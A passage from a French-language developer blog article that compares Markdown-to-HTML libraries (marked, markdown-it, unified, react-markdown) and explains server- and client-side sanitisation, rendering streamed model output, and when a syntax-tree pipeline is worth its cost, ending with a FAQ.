  stripIgnoreTagBody: ['script', 'style', 'iframe', 'object', 'embed'],
});

export const render = (markdown) =>
  filter.process(marked.parse(markdown, { gfm: true }));
```

`stripIgnoreTag` retire une balise inconnue plutôt que de l’échapper, ce qui est le défaut ;
`stripIgnoreTagBody` retire aussi son contenu, un `<script>` retiré ne laisse donc aucune source
derrière lui. Le paquet `xss` est gratuit, sous licence MIT, et analyse le HTML lui-même plutôt que de
réclamer un DOM, ce qui le rend utilisable dans une fonction sans jsdom (`FilterXSS`, `whiteList`,
`stripIgnoreTag` et `stripIgnoreTagBody` vérifiés sur github.com, le 9 septembre 2026).

C’est ainsi que TransformPipe est construit : marked pour l’analyse, DOMPurify dans le navigateur, le
paquet `xss` sur le serveur, une seule liste blanche importée par les deux, pour qu’un document se
lise pareil dans l’application et sur une page partagée. Un détail à retenir : les identifiants de
titre reçoivent un préfixe `doc-`. Un identifiant devient une propriété nommée sur `window`, et
DOMPurify retire les identifiants qui ressemblent à un risque de pollution tandis qu’un assainisseur
fondé sur un analyseur les conserve — le préfixe met fin aux deux problèmes à la fois. Le dossier en
faveur des listes blanches se trouve dans [assainir le Markdown en sécurité](/blog/sanitising-markdown-safely) ; les deux mêmes étapes en Python sont dans [Markdown vers HTML en Python](/blog/markdown-to-html-in-python).

## Rendre la sortie d’un modèle au fil du flux

La moitié du Markdown rendu dans un navigateur arrive désormais quelques caractères à la fois, depuis
un modèle, via un flux. Toute approche naïve de ce problème est la même approche : ajouter le morceau
à un tampon, re-rendre tout le tampon, fixer `innerHTML`. Cela fonctionne dans une démo et échoue de
quatre façons précises.

**Le document est syntaxiquement invalide la plupart du temps.** Markdown n’a pas d’analyse
partielle. Un tampon se terminant par l’ouverture d’une clôture signifie que tout ce qui suit est un
bloc de code, un tableau arrivant à l’intérieur d’un exemple délimité se rend donc comme du code, puis
comme un tableau, puis de nouveau comme du code quand la clôture de fermeture atterrit. Un
`[libellé](htt` à moitié tapé est du texte littéral une image et un lien la suivante. Un tableau dont
la ligne de séparation n’est pas encore arrivée est un paragraphe de barres verticales. Un simple `*`
en fin de tampon est un astérisque littéral jusqu’à ce que son partenaire apparaisse et que le reste
du paragraphe passe en italique. Rien de tout cela n’est un bogue de l’analyseur — l’analyseur rend
correctement un document qui est réellement incomplet.

**Remplacer `innerHTML` à chaque trame détruit l’état de la page.** La sélection de texte est perdue,
un `<details>` ouvert se referme, le focus se déplace, et un utilisateur ayant remonté pour relire
quelque chose est ramené brutalement en bas. C’est aussi la chose la plus coûteuse que l’on puisse
faire par token, puisqu’on jette un DOM que l’on s’apprête à reconstruire presque à l’identique.

**Le coût est quadratique.** Réanalyser et réassainir tout le tampon à chaque morceau signifie que le
travail par morceau croît avec la longueur de la réponse. Une courte réponse ne pose pas de problème ;
une réponse de deux mille mots avec une centaine de morceaux, c’est les cent derniers rendus qui font
chacun presque tout le travail du dernier.

**Il est facile de sauter l’assainissement sur les rendus intermédiaires.** N’assainir que le HTML
final est une faille avec une minuterie : chaque trame avant la dernière a mis du HTML non assaini
dans la page, et un gestionnaire `onerror` se déclenche au moment où il est analysé, pas quand le flux
se termine.

Ce qui fonctionne à la place, c’est un petit ensemble de règles :

1. **Rendez sur une horloge, pas sur un morceau.** Regroupez les morceaux et rendez au plus une fois
   par trame d’animation, ou toutes les 50 à 100 millisecondes. Le texte arrive plus vite que
   quiconque ne le lit.
2. **Séparez le tampon en installé et en direct.** Tout ce qui précède la dernière ligne vide qui
   n’est pas à l’intérieur d’une clôture ouverte ne changera plus. Rendez-le une fois, gardez-le dans
   le DOM, et ne re-rendez que la queue qui suit. Cela transforme le coût quadratique en coût
   linéaire.
3. **Suivez vous-même l’état des clôtures.** Comptez les ouvertures de clôture dans le tampon ; si le
   compte est impair, vous êtes à l’intérieur d’un bloc de code. Soit fermez-le pour le rendu
   intermédiaire, soit rendez la queue comme un `<pre>` simple jusqu’à l’arrivée de la vraie clôture
   de fermeture. L’une ou l’autre option est plus stable que de laisser l’analyseur deviner.
4. **Assainissez chaque rendu, pas seulement le dernier.** La liste blanche coûte des microsecondes
   face à une queue de quelques centaines de caractères. Il n’existe aucune version de ceci où un
   rendu partiel serait dispensé.
5. **Préférez un moteur de rendu par composants si vous êtes en React.** `react-markdown` réconcilie
   un DOM virtuel avec le précédent et applique la différence, ce qui est exactement le problème que
   pose le streaming, et c’est pourquoi il tient bon sous un flux là où une boucle `innerHTML` brute
   ne le fait pas.
6. **Ne passez pas à un arbre syntaxique en espérant que cela aide.** unified réanalyse aussi depuis
   zéro. Un arbre achète des transformations, pas une analyse incrémentale.

Quand le flux se termine et que vous avez le texte final, rendez-le une fois de plus depuis le début,
proprement. Ce dernier rendu est celui qui sera enregistré, copié ou exporté, et il ne devrait pas
porter les compromis dont le rendu en direct avait besoin — [transformer la sortie d’un modèle en une page lisible](/blog/ai-output-to-a-shareable-page) est un travail différent de l’afficher à mesure qu’elle arrive.

## Là où un arbre syntaxique est la mauvaise réponse

Le pipeline unified est l’option la plus capable de cette page, et le recommander par défaut est
l’erreur la plus commune sur ce sujet. Il coûte plus cher que ses défenseurs ne le disent, de quatre
façons.

**C’est sept dépendances avant d’écrire une seule ligne.** `unified`, `remark-parse`, `remark-gfm`,
`remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-stringify` — chacune avec son propre rythme
de sortie, son propre journal des modifications et sa propre version majeure qui finira par bouger
sans les autres. marked est un seul paquet. Dans une application soumise à une revue de sécurité, une
politique de chaîne d’approvisionnement ou un fichier de verrouillage que quelqu’un lit réellement,
sept contre un est un chiffre que l’on finit par soulever en réunion.

**C’est exclusivement ESM.** Les paquets le disent eux-mêmes. Dans un build moderne, ce n’est pas un
problème ; dans un service CommonJS, un bundler plus ancien ou un runner de tests configuré il y a des
années, c’est une journée de travail qui n’a rien à voir avec le Markdown.

**C’est davantage à résoudre et à évaluer au moment de l’import.** Sept paquets et leurs propres
dépendances doivent être trouvés et exécutés avant que le premier document ne soit analysé, là où
marked n’en fait qu’un. Nous n’avons pas mesuré la différence et ne vous demanderions pas de croire
notre chiffre si nous l’avions fait ; c’est la forme du coût qui compte. Sur un serveur de longue
durée, il est payé une fois et disparaît ; dans une fonction serverless, il est payé à chaque démarrage
à froid, par région, pour toujours.

**Cela a une vraie courbe d’apprentissage pour une petite première tâche.** Ajouter une classe à
chaque `<h2>` suppose de savoir que c’est un travail hast et non mdast, qu’il faut un plugin renvoyant
un transformateur, que `unist-util-visit` est un paquet séparé, et que les propriétés d’un nœud sont
`properties` avec `className` comme tableau. La règle équivalente pour markdown-it tient en quatre
lignes et n’exige qu’un seul concept. Si votre liste de transformations est « ajouter des identifiants
aux titres » et « ajouter `rel` aux liens externes », les deux autres bibliothèques le font sans arbre,
et vous aurez installé un compilateur pour changer deux chaînes.

L’inverse est également vrai, et c’est l’échec contre lequel cet article existe pour mettre en garde
dans l’autre sens : si vous vous surprenez à faire tourner une expression régulière sur du HTML rendu —
en remplaçant `<h2>`, en cherchant `<a href="`, en comptant `<img` — vous aviez besoin de l’arbre et
vous en avez construit un pire. Le HTML n’est pas un langage régulier, et chacune de ces
substitutions est correcte jusqu’au jour où quelqu’un écrit un bloc de code contenant la chaîne que
vous cherchiez.

La position honnête est que la plupart des pages rendent un document, une fois, et ne le transforment
jamais. Pour ces pages, le pipeline est du code de configuration que l’on relit pour toujours sans
bénéfice, et la bonne réponse est la petite bibliothèque plus un assainisseur. Passez à unified quand
vous pouvez nommer la transformation, pas quand vous soupçonnez que vous pourriez en vouloir une.

## Comment choisir

1. **Décidez si vous transformerez le document ou vous contenterez de le rendre.** Si une
   transformation figure quelque part dans vos besoins, choisissez un arbre dès maintenant, car
   l’ajouter après coup signifie réécrire chaque personnalisation faite contre des tokens ou des
   méthodes de moteur de rendu.
2. **Faites correspondre le dialecte aux fichiers que vous avez réellement.** Convertissez un vrai
   document — un avec un tableau, une liste de tâches et une note de bas de page — avant de vous
   engager, car une extension manquante ne lève pas d’erreur, elle rend votre tableau comme un
   paragraphe de barres verticales.
3. **Choisissez l’assainisseur avant l’analyseur.** L’assainisseur doit tourner partout où
   l’analyseur tourne, et DOMPurify sans DOM renvoie votre entrée inchangée, cette contrainte décide
   donc davantage de la forme de votre code que le choix de l’analyseur.
4. **Comptez les environnements d’exécution.** Rendre dans le navigateur et sur le serveur suppose une
   seule liste blanche importée par les deux, et une différence entre eux se manifeste comme un
   document qui a l’air différent une fois partagé de ce qu’il était à l’écriture — ce qui se lit comme
   une perte de données pour la personne qui l’a écrit.
5. **Nommez qui écrit l’entrée.** Si c’est votre propre équipe avec accès au dépôt, MDX et le HTML
   brut sont à votre disposition. Si c’est n’importe qui d’autre, ils ne le sont pas, et aucun soin
   apporté à la configuration ne change cette réponse.
6. **Regardez ce que vous devrez surcharger.** Notez les quatre choses que vous savez déjà nécessaires
   — identifiants de titres, gestion des liens externes, coloration du code, chargement différé des
   images — et vérifiez chacune contre les points d’extension de la bibliothèque avant de choisir, pas
   après.
7. **Testez avec un fichier hostile, pas un README.** Un document contenant `<script>`, un attribut
   `onerror`, un lien `javascript:` et une balise `<base>` prend une minute à écrire et vous en
   apprend davantage sur votre pipeline qu’une semaine à rendre votre propre documentation.

## Que faire de tout cela

Écrivez la liste blanche avant le moteur de rendu, et appelez l’assainisseur dans la même fonction que
l’analyse, pour que personne ne puisse accéder à l’un sans l’autre. Servez aussi la sortie fournie par
l’utilisateur sous une politique de sécurité de contenu : `script-src 'none'` ne coûte rien sur une
page qui n’est jamais qu’un document. Si l’entrée est un fichier Word plutôt que du Markdown, c’est
une bibliothèque différente et un ensemble différent d’échecs — [mammoth et les autres analyseurs docx](/blog/mammoth-js-and-docx-parsers) en parlent. Puis choisissez selon la forme du problème plutôt
que la popularité de la réponse : marked pour une chaîne, markdown-it pour un plugin, unified pour un
arbre, react-markdown pour des composants, et un assainisseur dédié dans les quatre cas. Si vous
n’aviez besoin du HTML qu’une seule fois plutôt que d’une bibliothèque dans votre bundle, [cette conversion](/) exécute les deux mêmes étapes dans votre navigateur et vous rend un fichier
autonome.

## FAQ

### Lequel est le plus rapide, marked ou markdown-it ?

Nous n’avons pas fait tourner de benchmark et vous ne devriez pas choisir sur celui de quelqu’un
d’autre. Les deux sont des analyseurs matures écrits pour le même travail, et dans tout usage
interactif — un panneau d’aperçu, un champ de commentaire, une seule page — la différence n’est pas ce
que vous remarquerez. Elle devient digne d’être mesurée quand vous rendez des milliers de documents
dans un build, et à ce stade, mesurez vos propres documents, car la réponse dépend de leur contenu
plutôt que d’un chiffre tiré du README d’un dépôt.

### marked est-il sûr sur du Markdown non fiable ?

Pas seul. Son README dit sans détour qu’il n’assainit pas sa sortie et renvoie vers DOMPurify,
sanitize-html ou insane (vérifié sur github.com, le 9 septembre 2026). L’ancienne option `sanitize` a
été retirée, un code qui la transmet encore est donc silencieusement ignoré, ce qui est pire que de
n’avoir aucune protection, parce que cela y ressemble.

### Comment ajouter des identifiants aux titres pour une table des matières ?

Dans marked, surchargez la méthode `heading` du moteur de rendu ou ajoutez le paquet
`marked-gfm-heading-id`. Dans markdown-it, utilisez un plugin d’ancrage ou surchargez la règle
`heading_open`. Dans unified, ajoutez un plugin qui parcourt l’arbre. Quel que soit votre choix,
préfixez l’identifiant — un identifiant nu devient une propriété nommée sur `window`, et un préfixe
comme `doc-` met fin à la fois à la collision et au risque de pollution.

### Pourquoi mon tableau se rend-il comme un paragraphe de barres verticales ?

Les tableaux ne font pas partie de CommonMark, une analyse strictement conforme n’en produit donc
pas. Vérifiez `gfm` dans marked, vérifiez que vous n’avez pas sélectionné le préréglage `commonmark`
dans markdown-it, et vérifiez que `remark-gfm` figure dans votre pipeline unified. L’échec est
silencieux par conception : un tableau que l’analyseur ne reconnaît pas est un paragraphe valide.

### Ai-je besoin de rehype-raw ?

Seulement si le Markdown contient du HTML brut que vous voulez voir rendu. `remark-rehype`
l’abandonne sinon, ce qui est le défaut sûr. Si vous l’ajoutez, il vous faut aussi
`allowDangerousHtml` sur `remark-rehype`, puis `rehype-sanitize` après les deux — le milieu de cette
séquence est le moment où un document non assaini existe réellement.

### Puis-je utiliser ces bibliothèques dans un navigateur sans bundler ?

Oui. marked, markdown-it, micromark et snarkdown tournent tous dans un navigateur et peuvent se
charger depuis un CDN comme modules ES. Les paquets unified sont exclusivement ESM, ce qui les rend
simples comme modules et malcommodes comme balise script. Souvenez-vous qu’un assainisseur doit aussi
se charger — un moteur de rendu seul dans la page est exactement la faille dont parle cet article.

### Quelle est la différence entre remark et rehype ?

Ce sont deux moitiés d’un même pipeline travaillant sur deux arbres différents. remark travaille sur
mdast, l’arbre Markdown, où les nœuds sont des titres, des listes et des liens. rehype travaille sur
hast, l’arbre HTML, où les nœuds sont des éléments avec des noms de balises et des propriétés.
`remark-rehype` fait le pont, et savoir de quel côté se trouve votre problème est l’essentiel de
l’apprentissage d’unified.
